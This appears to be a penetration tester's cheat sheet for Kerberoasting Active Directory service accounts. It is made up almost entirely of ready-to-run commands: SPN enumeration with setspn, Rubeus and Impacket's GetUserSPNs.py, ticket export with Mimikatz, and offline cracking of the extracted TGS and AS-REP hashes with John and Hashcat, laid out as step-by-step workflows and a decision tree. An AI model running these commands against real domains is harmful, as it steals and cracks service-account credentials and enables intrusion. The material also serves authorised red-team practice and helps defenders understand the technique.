# 🔑 Kerberoasting Notes

## 📝 Cheatsheets

### 🔵 Windows

|Command|Description|
|---|---|
|`setspn.exe -Q */*`|Enumerate SPNs|
|`mimikatz kerberos::list /export`|Dump/export tickets (.kirbi)|
|`.\Rubeus.exe kerberoast /stats`|Show roastable accounts|
|`.\Rubeus.exe kerberoast /user:<user> /nowrap`|Roast specific SPN|
|`.\Rubeus.exe kerberoast /outfile:hashes.txt`|Save hash in crack-ready format|
|`Get-DomainUser * -SPN|Get-DomainSPNTicket -Format Hashcat`|

---

### 🟢 Linux

|Command|Description|
|---|---|
|`GetUserSPNs.py domain/user:pass -dc-ip <IP>`|Enumerate SPNs|
|`GetUserSPNs.py ... -request`|Request TGS ticket(s)|
|`GetUserSPNs.py ... -outputfile hashes.txt`|Save TGS hashes (Hashcat-ready)|

---

### 🟣 Cracking

|Tool|Command|Notes|
|---|---|---|
|**John**|`john --format=krb5tgs hashes.txt --wordlist=rockyou.txt`|Crack TGS|
||`john --format=krb5asrep hashes.txt --wordlist=rockyou.txt`|Crack AS-REP|
|**Hashcat**|`hashcat -m 13100 hashes.txt rockyou.txt`|Kerberos TGS RC4-HMAC|
||`hashcat -m 19600 hashes.txt rockyou.txt`|Kerberos TGS AES128|
||`hashcat -m 19700 hashes.txt rockyou.txt`|Kerberos TGS AES256|
||`hashcat -m 18200 hashes.txt rockyou.txt`|Kerberos AS-REP (RC4)|

---

### 🔐 Hash Type Reference

|Ticket Type|Encryption|Hashcat Mode|John Format|
|---|---|---|---|
|TGS|RC4-HMAC (etype 23)|13100|krb5tgs|
|TGS|AES128 (etype 17)|19600|krb5tgs|
|TGS|AES256 (etype 18)|19700|krb5tgs|
|AS-REP|RC4-HMAC (etype 23)|18200|krb5asrep|

---

## ⚡ Decision Tree

`Are you on Windows?  ├─ Do you want automated? → Use Rubeus (direct hash export)  └─ Do you want manual? → setspn + Mimikatz (.kirbi) + kirbi2john  Are you on Linux?  └─ Use Impacket GetUserSPNs.py (direct hash export)`

---

## 📂 Workflows

<details> <summary>🔵 Windows Manual Workflow (Mimikatz)</summary>

1. Enumerate SPNs:  
    `setspn.exe -Q */*`
    
2. Request TGS:  
    `klist` or `New-Object KerberosRequestorSecurityToken "<SPN>"`
    
3. Export ticket:  
    `mimikatz kerberos::list /export` → gives `.kirbi`
    
4. Convert:  
    `kirbi2john.py ticket.kirbi > hash.txt`
    
5. Crack with John or Hashcat.
    

</details>

---

<details> <summary>🔵 Windows Automated Workflow (Rubeus)</summary>

1. Enumerate roastable accounts:  
    `.\Rubeus.exe kerberoast /stats`
    
2. Roast directly:  
    `.\Rubeus.exe kerberoast /user:<user> /nowrap /outfile:hashes.txt`
    
3. Crack `hashes.txt` with Hashcat/John (no .kirbi step needed).
    

</details>

---

<details> <summary>🟢 Linux Workflow (Impacket)</summary>

1. Enumerate SPNs:  
    `GetUserSPNs.py domain/user:pass -dc-ip <IP>`
    
2. Request ticket & export hash:  
    `GetUserSPNs.py ... -request -outputfile hashes.txt`
    
3. Crack `hashes.txt` with Hashcat/John (already in proper format).
    

</details>